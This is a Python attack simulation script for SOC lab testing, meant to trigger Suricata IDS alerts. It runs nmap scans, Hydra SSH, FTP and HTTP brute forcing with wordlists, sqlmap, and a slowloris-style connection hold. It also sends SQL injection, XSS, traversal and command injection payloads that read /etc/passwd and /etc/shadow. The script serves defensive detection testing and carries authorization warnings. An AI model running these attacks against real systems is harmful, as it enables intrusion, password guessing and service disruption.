#!/usr/bin/env python3
"""
simulate_attacks.py — Attack Simulation Script for SOC Lab Testing
Generates realistic network attacks to trigger Suricata IDS rules.

IMPORTANT: Only run against machines you own / have explicit permission to test.
This script is for lab/educational use only.

Usage:
  python3 simulate_attacks.py --target 192.168.56.101 --attack all
  python3 simulate_attacks.py --target 192.168.56.101 --attack nmap
  python3 simulate_attacks.py --target 192.168.56.101 --attack brute
  python3 simulate_attacks.py --target 192.168.56.101 --attack sqli
  python3 simulate_attacks.py --target 192.168.56.101 --attack dos
"""

import argparse
import logging
import os
import subprocess
import sys
import time
import random
import socket
import threading
from typing import List

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
)
logger = logging.getLogger("soc_triage.simulate")

# ─── CONSTANTS ───────────────────────────────────────────────────────────────

SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT NULL, version(), NULL --",
    "admin'--",
    "' OR 1=1--",
    "1' AND SLEEP(5)--",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables--",
]

WORDLIST_PASSWORDS = [
    "password", "123456", "admin", "root", "test",
    "letmein", "qwerty", "abc123", "monkey", "master",
    "dragon", "pass", "12345", "welcome", "login",
]

COMMON_USERNAMES = ["root", "admin", "administrator", "user", "test", "ubuntu", "pi"]

USER_AGENTS_MALICIOUS = [
    "sqlmap/1.7.8#stable (https://sqlmap.org)",
    "Nikto/2.1.6",
    "DirBuster-1.0-RC1",
    "masscan/1.3.2",
    "zgrab/0.x",
]

# ─── HELPER FUNCTIONS ─────────────────────────────────────────────────────────

def run_command(cmd: List[str], description: str) -> bool:
    """Run a shell command and log the result."""
    logger.info("Running: %s", description)
    logger.debug("Command: %s", " ".join(cmd))
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=120,
        )
        if result.returncode == 0:
            logger.info("✓ %s completed", description)
        else:
            logger.warning("⚠ %s returned exit code %d", description, result.returncode)
        if result.stdout:
            logger.debug("stdout: %s", result.stdout[:500])
        return True
    except subprocess.TimeoutExpired:
        logger.warning("Timeout on: %s", description)
        return False
    except FileNotFoundError:
        logger.error("Tool not found for: %s. Is it installed?", description)
        return False
    except Exception as exc:
        logger.error("Error running %s: %s", description, exc)
        return False


def check_tool(tool: str) -> bool:
    """Check if a CLI tool is available."""
    result = subprocess.run(["which", tool], capture_output=True)
    return result.returncode == 0


def print_banner():
    print("""
╔═══════════════════════════════════════════════════════╗
║        SOC Lab Attack Simulation Suite                ║
║        FOR AUTHORIZED TESTING ONLY                    ║
╚═══════════════════════════════════════════════════════╝
""")


# ─── ATTACK MODULES ──────────────────────────────────────────────────────────

class NmapScanner:
    """
    Port scanning using Nmap.
    Triggers Suricata rules: ET SCAN categories (SID 2000000+)
    """

    def __init__(self, target: str):
        self.target = target

    def run_syn_scan(self):
        """SYN/stealth scan — triggers ET SCAN Potential SSH Scan, Nmap scan patterns."""
        logger.info("=== NMAP SYN SCAN (stealth) ===")
        if not check_tool("nmap"):
            logger.error("nmap not installed. Run: sudo apt install -y nmap")
            return

        run_command(
            ["sudo", "nmap", "-sS", "-p", "1-1024", "--open", "-T3", self.target],
            "Nmap SYN scan (ports 1-1024)",
        )

    def run_aggressive_scan(self):
        """Aggressive OS/version detection scan — triggers multiple Suricata categories."""
        logger.info("=== NMAP AGGRESSIVE SCAN ===")
        run_command(
            ["sudo", "nmap", "-A", "-T4", "--script",
             "banner,default,vuln", self.target],
            "Nmap aggressive scan with scripts",
        )

    def run_udp_scan(self):
        """UDP scan — triggers ET SCAN UDP patterns."""
        logger.info("=== NMAP UDP SCAN ===")
        run_command(
            ["sudo", "nmap", "-sU", "-p", "53,67,68,123,161,500,514",
             "--open", self.target],
            "Nmap UDP scan (common UDP ports)",
        )

    def run_xmas_scan(self):
        """XMAS scan — triggers ET SCAN NMAP XMAS rule."""
        logger.info("=== NMAP XMAS SCAN ===")
        run_command(
            ["sudo", "nmap", "-sX", "-p", "1-500", self.target],
            "Nmap XMAS scan",
        )

    def run_all(self):
        self.run_syn_scan()
        time.sleep(3)
        self.run_aggressive_scan()
        time.sleep(3)
        self.run_udp_scan()
        time.sleep(3)
        self.run_xmas_scan()


class BruteForceAttacker:
    """
    Brute force attacks using Hydra.
    Triggers Suricata rules: ET BRUTE category (SID 2001219+)
    """

    def __init__(self, target: str):
        self.target = target
        self.wordlist_file = "/tmp/soc_test_passwords.txt"
        self.userlist_file = "/tmp/soc_test_users.txt"

    def _write_wordlists(self):
        with open(self.wordlist_file, "w") as f:
            f.write("\n".join(WORDLIST_PASSWORDS))
        with open(self.userlist_file, "w") as f:
            f.write("\n".join(COMMON_USERNAMES))
        logger.info("Wordlists written to /tmp/")

    def run_ssh_brute(self):
        """SSH brute force — triggers ET BRUTE SSH Brute Force rules."""
        logger.info("=== SSH BRUTE FORCE (Hydra) ===")
        if not check_tool("hydra"):
            logger.error("hydra not installed. Run: sudo apt install -y hydra")
            return
        self._write_wordlists()
        run_command(
            ["hydra", "-L", self.userlist_file, "-P", self.wordlist_file,
             "-t", "4", "-w", "3", "-f",
             f"ssh://{self.target}"],
            "Hydra SSH brute force",
        )

    def run_ftp_brute(self):
        """FTP brute force — triggers ET BRUTE FTP Brute Force rules."""
        logger.info("=== FTP BRUTE FORCE (Hydra) ===")
        if not check_tool("hydra"):
            return
        self._write_wordlists()
        run_command(
            ["hydra", "-L", self.userlist_file, "-P", self.wordlist_file,
             "-t", "4", f"ftp://{self.target}"],
            "Hydra FTP brute force",
        )

    def run_http_brute(self, path: str = "/login"):
        """HTTP form brute force — triggers ET BRUTE HTTP rules."""
        logger.info("=== HTTP BRUTE FORCE (Hydra) ===")
        if not check_tool("hydra"):
            return
        self._write_wordlists()
        run_command(
            ["hydra", "-L", self.userlist_file, "-P", self.wordlist_file,
             "-t", "4",
             f"http-post-form://{self.target}{path}:username=^USER^&password=^PASS^:F=Invalid"],
            "Hydra HTTP form brute force",
        )

    def run_all(self):
        self.run_ssh_brute()
        time.sleep(5)
        self.run_ftp_brute()
        time.sleep(5)
        self.run_http_brute()


class WebApplicationAttacker:
    """
    Web application attacks using curl and sqlmap.
    Triggers Suricata rules: ET WEB_SERVER category, ET SQL categories.
    """

    def __init__(self, target: str, port: int = 80):
        self.target = target
        self.port = port
        self.base_url = f"http://{target}:{port}"

    def run_directory_traversal(self):
        """Directory traversal — triggers ET WEB_SERVER Directory Traversal rules."""
        logger.info("=== DIRECTORY TRAVERSAL ATTACKS ===")
        payloads = [
            "/../../../etc/passwd",
            "/..%2f..%2f..%2fetc%2fpasswd",
            "/%2e%2e/%2e%2e/%2e%2e/etc/shadow",
            "/.%252e/.%252e/etc/passwd",
        ]
        for payload in payloads:
            url = f"{self.base_url}{payload}"
            run_command(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                 "--connect-timeout", "3", url],
                f"Directory traversal: {payload[:40]}",
            )
            time.sleep(0.5)

    def run_sql_injection(self, path: str = "/index.php"):
        """SQL injection — triggers ET SQL Injection rules."""
        logger.info("=== SQL INJECTION ATTACKS ===")
        for payload in SQL_INJECTION_PAYLOADS:
            url = f"{self.base_url}{path}?id={payload}"
            run_command(
                ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                 "--connect-timeout", "3",
                 "-H", "User-Agent: sqlmap/1.7.8",
                 url],
                f"SQL injection: {payload[:30]}",
            )
            time.sleep(0.3)

    def run_xss_attack(self, path: str = "/search"):
        """XSS — triggers ET WEB_SERVER XSS rules."""
        logger.info("=== XSS ATTACKS ===")
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(document.cookie)",
            "<svg/onload=alert(1)>",
        ]
        for payload in payloads:
            url = f"{self.base_url}{path}?q={payload}"
            run_command(
                ["curl", "-s", "-o", "/dev/null", "--connect-timeout", "3", url],
                f"XSS: {payload[:30]}",
            )
            time.sleep(0.3)

    def run_command_injection(self, path: str = "/ping"):
        """Command injection — triggers ET WEB_SERVER Command Injection rules."""
        logger.info("=== COMMAND INJECTION ATTACKS ===")
        payloads = [
            "; cat /etc/passwd",
            "| whoami",
            "; ls -la /",
            "`id`",
        ]
        for payload in payloads:
            url = f"{self.base_url}{path}?host=127.0.0.1{payload}"
            run_command(
                ["curl", "-s", "-o", "/dev/null", "--connect-timeout", "3", url],
                f"Command injection: {payload}",
            )
            time.sleep(0.3)

    def run_sqlmap(self, path: str = "/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"):
        """Full sqlmap scan (requires DVWA or similar)."""
        logger.info("=== SQLMAP AUTOMATED SCAN ===")
        if not check_tool("sqlmap"):
            logger.warning("sqlmap not installed. Run: sudo apt install -y sqlmap")
            return
        url = f"{self.base_url}{path}"
        run_command(
            ["sqlmap", "-u", url, "--level=1", "--risk=1",
             "--batch", "--output-dir=/tmp/sqlmap_output",
             "--random-agent"],
            "sqlmap automated SQL injection scan",
        )

    def run_all(self):
        self.run_directory_traversal()
        time.sleep(2)
        self.run_sql_injection()
        time.sleep(2)
        self.run_xss_attack()
        time.sleep(2)
        self.run_command_injection()


class DoSSimulator:
    """
    Simple DoS simulation using raw TCP connections.
    Triggers Suricata rules: ET DOS category.
    NOTE: Very mild — only creates TCP connections, does not flood packets.
    """

    def __init__(self, target: str, port: int = 80, num_connections: int = 50):
        self.target = target
        self.port = port
        self.num_connections = num_connections

    def run_slowloris_simulation(self):
        """
        Simulate a Slowloris-style attack — open many half-complete HTTP requests.
        Triggers ET DOS Possible Slowloris DoS Attack rules.
        """
        logger.info("=== SLOWLORIS SIMULATION (%d connections) ===", self.num_connections)
        sockets = []
        try:
            for i in range(self.num_connections):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target, self.port))
                    s.send(b"GET / HTTP/1.1\r\nHost: target\r\nUser-Agent: slowloris\r\n")
                    sockets.append(s)
                except Exception:
                    pass
                time.sleep(0.05)
            logger.info("Opened %d slow connections. Holding for 5s...", len(sockets))
            time.sleep(5)
        finally:
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass
            logger.info("DoS simulation complete.")

    def run_all(self):
        self.run_slowloris_simulation()


# ─── MAIN ────────────────────────────────────────────────────────────────────

def main():
    print_banner()
    parser = argparse.ArgumentParser(
        description="SOC Lab Attack Simulation (AUTHORIZED USE ONLY)"
    )
    parser.add_argument("--target", required=True, help="Target IP address")
    parser.add_argument(
        "--attack",
        choices=["nmap", "brute", "sqli", "dos", "all"],
        default="all",
        help="Attack type to run",
    )
    parser.add_argument("--port", type=int, default=80, help="Target web port (default: 80)")
    args = parser.parse_args()

    logger.info("Target: %s | Attack: %s", args.target, args.attack)
    logger.warning("Ensure you have authorization to test %s!", args.target)
    time.sleep(2)

    nmap = NmapScanner(args.target)
    brute = BruteForceAttacker(args.target)
    web = WebApplicationAttacker(args.target, args.port)
    dos = DoSSimulator(args.target, args.port)

    if args.attack in ("nmap", "all"):
        nmap.run_all()
    if args.attack in ("brute", "all"):
        brute.run_all()
    if args.attack in ("sqli", "all"):
        web.run_all()
    if args.attack in ("dos", "all"):
        dos.run_all()

    logger.info(
        "\n✅ Attack simulation complete. Check Suricata eve.json for generated alerts:\n"
        "   sudo tail -f /var/log/suricata/eve.json | python3 -m json.tool"
    )


if __name__ == "__main__":
    main()
